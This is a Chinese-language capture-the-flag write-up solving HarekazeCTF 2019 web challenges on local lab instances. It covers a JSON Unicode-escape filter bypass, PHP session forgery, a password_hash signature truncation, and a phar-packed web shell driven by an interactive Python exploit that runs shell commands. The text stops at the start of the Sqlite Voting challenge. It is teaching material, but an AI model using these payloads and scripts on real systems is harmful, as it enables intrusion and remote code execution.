<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>在 buuoj 上看到的这个比赛题目，期间平台关了，就拿了 Dockerfile 本地做了，web 题目感觉还不错</p>
<h1 data-content="1" id="64121324a403d5614fc5d1ed5fd11023">encode_and_encode [100]</h1>
<ul>
<li>
<p>打开靶机，前两个页面都是 html 页面，第三个给了页面源码</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_encode_1.png"/></p>
</li>
<li>
<p>源码如下</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'source'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">is_valid</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$banword</span> <span class="o">=</span> <span class="p">[</span>
      <span class="c1">// no path traversal</span>
      <span class="s1">'\.\.'</span><span class="p">,</span>
      <span class="c1">// no stream wrapper</span>
      <span class="s1">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="p">,</span>
      <span class="c1">// no data exfiltration</span>
      <span class="s1">'flag'</span>
    <span class="p">];</span>
    <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$banword</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'/i'</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$body</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'php://input'</span><span class="p">);</span>
<span class="nv">$json</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$body</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$body</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$json</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$json</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$json</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$content</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
      <span class="nv">$content</span> <span class="o">=</span> <span class="s2">"&lt;p&gt;not found&lt;/p&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="s1">'&lt;p&gt;invalid request&lt;/p&gt;'</span><span class="p">;</span>
  <span class="p">}</span>

<span class="c1">// no data exfiltration!!!</span>
<span class="nv">$content</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/HarekazeCTF\{.+\}/i'</span><span class="p">,</span> <span class="s1">'HarekazeCTF{&amp;lt;censored&amp;gt;}'</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">json_encode</span><span class="p">([</span><span class="s1">'content'</span> <span class="o">=&gt;</span> <span class="nv">$content</span><span class="p">]);</span>
</pre></div>
<ul>
<li>
<p><code>file_get_contents('php://input')</code> 获取 post 的数据，<code>json_decode($body, true)</code> 用 json 格式解码 post 的数据，然后 <code>is_valid($body)</code> 对 post 数据检验，大概输入的格式如下</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_encode_2.png"/></p>
</li>
<li>
<p><code>is_valid($body)</code> 对 post 数据检验，导致无法传输 <code>$banword</code> 中的关键词，也就无法传输 <code>flag</code>，这里在 json 中，可以使用 Unicode 编码绕过，<code>flag</code> 就等于 <code>\u0066\u006c\u0061\u0067</code></p>
</li>
<li>
<p>通过检验后，获取 <code>page</code> 对应的文件，并且页面里的内容也要通过 <code>is_valid</code> 检验，然后将文件中 <code>HarekazeCTF{}</code> 替换为 <code>HarekazeCTF{&amp;lt;censored&amp;gt;}</code> ，这样就无法明文读取 flag</p>
</li>
<li>
<p>这里传入 <code>/\u0066\u006c\u0061\u0067</code> 后，由于 <code>flag</code> 文件中也包含 flag 关键字，所以返回 <code>not found</code> ，这也无法使用 <code>file://</code></p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_encode_3.png"/></p>
</li>
<li>
<p><code>file_get_contents</code> 是可以触发 <code>php://filter</code> 的，所以考虑使用伪协议读取，对 <code>php</code> 的过滤使用 <code>Unicode</code> 绕过即可</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_encode_4.png"/></p>
</li>
<li>
<p>可以看出，json 在传输时是 Unicode 编码的</p>
</li>
</ul>
<h1 data-content="1" id="6ba72edff23d3d2f89d18772485950d0">Avatar Uploader 1 [100]</h1>
<ul>
<li>
<p>给了源码，打开靶机，登录之后，是一个文件上传</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar1_1.png"/></p>
</li>
<li>
<p>首先 <code>config.php</code> 中定义了一些常量</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar1_2.png"/></p>
</li>
<li>
<p>然后在 <code>upload.php</code> 中判断文件大小，并使用 <code>FILEINFO</code> 判断上传图片类型，上传图片只能是 png 类型</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar1_3.png"/></p>
</li>
<li>
<p>后面再用 <code>getimagesize</code> 判断文件像素大小，并且再进行一次类型判断，如果不是 png 类型就给出 flag</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar1_4.png"/></p>
</li>
<li>
<p>在这两种判断上传图片类型的函数中，有一个很有趣的现象， <code>FILEINFO</code> 可以识别 png 图片( 十六进制下 )的第一行，而 <code>getimagesize</code> 不可以，代码如下</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nb">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME_TYPE</span><span class="p">);</span>

<span class="nb">var_dump</span><span class="p">(</span><span class="nb">finfo_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">"test"</span><span class="p">));</span>

<span class="nv">$f</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="s2">"test"</span><span class="p">);</span> 
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="nx">IMAGETYPE_PNG</span><span class="p">);</span>
</pre></div>
<ul>
<li>
<p>结果，16进制文件也在下面</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar1_5.png"/></p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar1_6.png"/></p>
</li>
<li>
<p>直接上传这个文件就可以获取 flag 了</p>
</li>
</ul>
<h1 data-content="1" id="766f56aaa3d8a998ae3a49645efe6401">Easy Notes [200]</h1>
<ul>
<li>
<p>给了源码，打开靶机，是一个笔记系统</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_notes_1.png"/></p>
</li>
<li>
<p>在登陆处进行了匹配，只允许输入 4 到 64 位规定字符，且不是前端验证</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_notes_2.png"/></p>
</li>
<li>
<p>登陆成功后，可以进行增删查和导出为 zip 或 tar 的功能，点击 <code>Get flag</code> 提示不是 admin</p>
</li>
<li>
<p>既然拿到源码就先看看全局配置 <code>config.php</code> ，就写了一行，定义临时文件目录</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="x">define('TEMP_DIR', '/var/www/tmp');</span>
</pre></div>
<ul>
<li>
<p>进入 <code>page/flag.php</code> 看一下给出 flag 的条件，要满足 <code>is_admin()</code> 函数</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_notes_3.png"/></p>
</li>
<li>
<p>跟进 <code>is_admin()</code> 函数，没有发现什么可以利用的地方</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_notes_4.png"/></p>
</li>
<li>
<p>看到有个导出功能，它会将添加的 note 导出为 zip，这个文件存放的位置在 <code>TEMP_DIR</code> ，和 <code>session</code> 信息保存在同一个位置，那么是不是可以考虑伪造 session</p>
</li>
<li>
<p>session 文件以 <code>sess_</code> 开头，且只含有 <code>a-z</code>，<code>A-Z</code>，<code>0-9</code>，<code>-</code></p>
</li>
<li>
<p>看到 <code>$filename</code> 处可以满足所有的条件</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_notes_5.png"/></p>
</li>
<li>
<p>构造 <code>user</code> 为 <code>sess_</code> ，<code>type</code> 为 <code>.</code> ，经过处理之后，<code>$path</code> 就是 <code>TEMP_DIR/sess_0123456789abcdef</code> 这就伪造了一个 session 文件</p>
</li>
<li>
<p>然后向这个文件写入 note 的 <code>title</code></p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_notes_6.png"/></p>
</li>
<li>
<p>php 默认的 session 反序列化方式是 <code>php</code> ，其存储方式为 <code>键名+竖线+经过serialize函数序列处理的值</code> ，这就可以伪造 <code>admin</code> 了</p>
</li>
<li>
<p>在最后，它会将构造的 <code>$filename</code> 返回，这样就可以拿到构造出的 admin 的 session 数据</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_notes_7.png"/></p>
</li>
<li>
<p>很典型的 session 伪造，session 反序列化</p>
</li>
<li>
<p>利用脚本</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="n">URL</span> <span class="o">=</span> <span class="s1">'http://192.168.233.136:9000/'</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="c1"># login as sess_</span>
    <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">'login.php'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">'user'</span><span class="p">:</span> <span class="s1">'sess_'</span>
    <span class="p">})</span>

    <span class="c1"># make a crafted note</span>
    <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">'add.php'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">'title'</span><span class="p">:</span> <span class="s1">'|N;admin|b:1;'</span><span class="p">,</span>
        <span class="s1">'body'</span><span class="p">:</span> <span class="s1">'hello'</span>
    <span class="p">})</span>

    <span class="c1"># make a fake session</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">'export.php?type=.'</span><span class="p">)</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">'Content-Disposition'</span><span class="p">]</span>
    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

    <span class="n">sessid</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">'sess_([0-9a-z-]+)'</span><span class="p">,</span> <span class="n">r</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">print</span><span class="p">(</span><span class="n">sessid</span><span class="p">)</span>

    <span class="c1"># get the flag</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">'?page=flag'</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">'PHPSESSID'</span><span class="p">:</span> <span class="n">sessid</span>
    <span class="p">})</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">'HarekazeCTF\{.+\}'</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>

    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">break</span>
</pre></div>
<h1 data-content="1" id="8927201de7abc196cd2b33995401cf23">Avatar Uploader 2 [300]</h1>
<ul>
<li>接 <code>Uploader1</code> ，这里是找第二个 flag</li>
<li>给的 hint: <a href="https://php.net/manual/ja/function.password-hash.php" target="_blank">https://php.net/manual/ja/function.password-hash.php</a>
</li>
<li>
<code>upload.php</code> 中可以利用的暂时已经利用完了，看一下 <code>index.php</code> 吧</li>
<li>
<code>index.php</code> 代码简化大致如下</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="k">require_once</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>
<span class="k">require_once</span><span class="p">(</span><span class="s1">'lib/util.php'</span><span class="p">);</span>
<span class="k">require_once</span><span class="p">(</span><span class="s1">'lib/session.php'</span><span class="p">);</span>

<span class="nv">$session</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SecureClientSession</span><span class="p">(</span><span class="nx">CLIENT_SESSION_ID</span><span class="p">,</span> <span class="nx">SECRET_KEY</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$session</span><span class="o">-&gt;</span><span class="na">isset</span><span class="p">(</span><span class="s1">'flash'</span><span class="p">))</span> <span class="p">{</span>
  <span class="nv">$flash</span> <span class="o">=</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'flash'</span><span class="p">);</span>
  <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">unset</span><span class="p">(</span><span class="s1">'flash'</span><span class="p">);</span>
<span class="p">}</span>
<span class="nv">$avatar</span> <span class="o">=</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">isset</span><span class="p">(</span><span class="s1">'avatar'</span><span class="p">)</span> <span class="o">?</span> <span class="s1">'uploads/'</span> <span class="o">.</span> <span class="nv">$session</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'avatar'</span><span class="p">)</span> <span class="o">:</span> <span class="s1">'default.png'</span> <span class="p">;</span>
<span class="nv">$session</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>

<span class="k">include</span><span class="p">(</span><span class="s1">'common.css'</span><span class="p">);</span>

<span class="k">include</span><span class="p">(</span><span class="nv">$session</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'theme'</span><span class="p">,</span> <span class="s1">'light'</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'.css'</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$session</span><span class="o">-&gt;</span><span class="na">isset</span><span class="p">(</span><span class="s1">'name'</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"Hello"</span><span class="o">.</span><span class="nv">$session</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">)</span><span class="o">.</span><span class="s2">"&lt;/br&gt;"</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$flash</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$flash</span><span class="p">[</span><span class="s1">'type'</span><span class="p">]</span><span class="o">.</span><span class="s2">"&lt;/br&gt;"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$flash</span><span class="p">[</span><span class="s1">'message'</span><span class="p">]</span><span class="o">.</span><span class="s2">"&lt;/br&gt;"</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$session</span><span class="o">-&gt;</span><span class="na">isset</span><span class="p">(</span><span class="s1">'name'</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"Please upload"</span><span class="o">.</span><span class="s2">"&lt;/br&gt;"</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"Please sign in"</span><span class="o">.</span><span class="s2">"&lt;/br&gt;"</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<ul>
<li>
<p>这里的 session 处理机制是自己写的，在 <code>lib\session.php</code> 中，首先确认的事情是，登录后 HTTP 头部返回的 <code>Cookie</code> 是 <code>session=******.******</code>  这种格式的</p>
</li>
<li>
<p>首先 <code>__construct</code> 中，判断 <code>session</code> 是否存在 <code>$_COOKIE</code> 中，如果存在则以 <code>.</code> 分割 <code>session</code> ，然后对 <code>data</code> 和 <code>signature</code> 进行 <code>verify</code> 函数认证，认证成功就返回数据的 <code>json_decode</code> 的结果</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar2_1.png"/></p>
</li>
<li>
<p><code>isset</code> 中判断参数 <code>$key</code> 是否在 <code>data</code> 中，<code>get</code> 中返回 <code>data</code> 中 <code>key</code> 为参数 <code>$key</code> 的数据，<code>set</code> 中将 <code>data</code> 中  <code>key</code> 为参数 <code>$key</code> 的数据设置为参数 <code>$value</code>，<code>unset</code> 中删除 <code>data</code> 中 <code>key</code> 为参数 <code>$key</code> 的数据</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar2_2.png"/></p>
</li>
<li>
<p><code>save</code> 中将 <code>data</code> 转化为 json 并进行 <code>urlsafe_base64_encode</code>，再用 <code>sign</code> 对 <code>data</code> 进行签名</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar2_3.png"/></p>
</li>
<li>
<p>这样整个 <code>session.php</code> 就完了，回到 <code>index.php</code>，然后进行的是 <code>flash</code> 的判断，找了一下，在 <code>lib\util.php</code> 中描述了 <code>flash</code> 并且给了调用 <code>flash</code> 函数的条件，即 <code>error</code> 函数，找了一下，<code>error</code> 在 <code>upload.php</code> 中，上传失败时调用</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar2_4.png"/></p>
</li>
<li>
<p>做的测试如图，<code>flash</code> 将错误信息保存在 <code>session</code> 中的</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar2_5.png"/></p>
</li>
<li>
<p>根据给的提示，<code>password_hash</code> 函数是存在安全隐患的，它的第一个参数不能超过 72 个字符，这个函数在 <code>sign</code> 中被调用，<code>sign</code> 被 <code>save</code> 调用，<code>save</code> 在 <code>index.php</code> 中被调用</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar2_6.png"/></p>
</li>
<li>
<p><code>password_hash</code> 函数的漏洞就意味着只对前 72 个字符进行签名，只要前 72 个字符相同，那么就会在校验时通过</p>
</li>
<li>
<p>那么是不是可以登录一次，然后访问 <code>upload.php</code> 触发 <code>error</code> 函数，这样就能绕过 session 校验，然后对 data 信息进行修改，进而触发其他操作</p>
</li>
<li>
<p>可以看到，在 <code>index.php</code> 中存在一行代码 <code>include($session-&gt;get('theme','light').'.css');</code> ，session 信息是由我们控制的，那么就可以通过 phar 协议，触发 LFI ，首先要把 phar 文件上传，里面复合一个假的 css 文件，存放一句话，这样就可以在 <code>include</code> 时触发 RCE</p>
</li>
<li>
<p>生成 phar 代码</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$png_header</span> <span class="o">=</span> <span class="nb">hex2bin</span><span class="p">(</span><span class="s1">'89504e470d0a1a0a0000000d49484452000000400000004000'</span><span class="p">);</span>
<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">'exp.phar'</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">'exp.css'</span><span class="p">,</span> <span class="s1">'&lt;?php system($_GET["cmd"]); ?&gt;'</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="nv">$png_header</span> <span class="o">.</span> <span class="s1">'&lt;?php __HALT_COMPILER(); ?&gt;'</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</pre></div>
<ul>
<li>
<p>本地对这个 phar 做的一个测试</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_avatar2_7.png"/></p>
</li>
<li>
<p>新登录一个用户，上传这个 phar，记录这个 phar 的地址和名字，然后去 <code>upload.php</code> 触发一次 <code>error</code> ，记录 <code>data</code> 和 <code>signature</code> ，修改 <code>data</code> ，增加 <code>theme</code> 键，键值为 phar 协议读取上传的文件，然后生成 session 再去访问 <code>index.php</code> 传入命令即可</p>
</li>
<li>
<p>exp.py</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>

<span class="n">url</span> <span class="o">=</span> <span class="s1">'http://192.168.233.136:9003/'</span>

<span class="k">def</span> <span class="nf">b64decode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s1">'='</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3</span> <span class="o">-</span> <span class="p">(</span><span class="mi">3</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">%</span> <span class="mi">4</span><span class="p">))</span>

<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"peri0d"</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="n">url_1</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">'signin.php'</span>
<span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url_1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">'name'</span><span class="p">:</span> <span class="n">username</span><span class="p">})</span>

<span class="n">url_2</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">'upload.php'</span>
<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'exp.phar'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span>
<span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_2</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">'file'</span><span class="p">:</span> <span class="p">(</span><span class="s1">'exp.png'</span><span class="p">,</span> <span class="n">f</span><span class="p">)})</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">avatar</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s1">'avatar'</span><span class="p">]</span>

<span class="n">url_3</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">'upload.php'</span>
<span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_3</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">data</span><span class="p">,</span> <span class="n">sig</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">b</span><span class="s1">'}}'</span><span class="p">,</span> <span class="s1">'}},"theme":"phar://uploads/{}/exp"}}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">avatar</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">sess</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">'session'</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'='</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">sig</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">'&gt; '</span><span class="p">)</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">'?cmd='</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">command</span><span class="p">))</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">'/\* light/dark.css \*/(.+)/\*\*/'</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</pre></div>
<h1 data-content="1" id="a25b66bc57af1015b8dada35526a899a">Sqlite Voting [350]</h1>
<ul>
<li>
<p>打开靶机，看到投票的页面，并且给了源码</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_vote_1.png"/></p>
</li>
<li>
<p>在 <code>vote.php</code> 页面 <code>POST</code> 参数 <code>id</code> ，只能为数字。并且在 <code>schema.sql</code> 中发现了 <code>flag</code> 表</p>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="k">DROP</span> <span class="k">TABLE</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="ss">`vote`</span><span class="p">;</span>
